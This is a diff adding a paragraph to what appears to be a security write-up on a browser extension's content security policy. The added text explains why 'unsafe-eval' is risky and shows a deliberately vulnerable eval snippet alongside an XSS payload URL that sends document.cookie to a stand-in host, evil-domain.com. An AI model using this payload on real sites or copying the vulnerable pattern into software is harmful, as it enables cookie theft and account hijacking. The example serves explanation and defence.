@@ -89,6 +89,18 @@ The extension’s **CSP** (content security policy) dictates what the script and
 "content_security_policy": "script-src 'self' https://*.vimeo.com 'unsafe-eval'; object-src https://*.vimeo.com 'self'",
 ```
 
+Anything allowing the use of `eval` should raise suspicion since it runs any JS code that is represented as a string. The dangers of this function are pretty [well](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval) [documented](https://www.digitalocean.com/community/tutorials/js-eval). As a quick example, an innocent looking snippet can be modified to send `httpOnly` cookies to the attacker’s domain.
+
+```js
+// app.js
+eval('alert("Your query string was ' + unescape(document.location.search) + '");');
+
+// Then, we can set the query parameter of the current URL to something like this to perform XSS:
+// http://test.com?param%22);new Image().src='https://evil-domain.com/?cookie='+escape(document.cookie)
+```
+
+
+
 The last notable section is the `permissions` key in the manifest file. 
 
 ```json
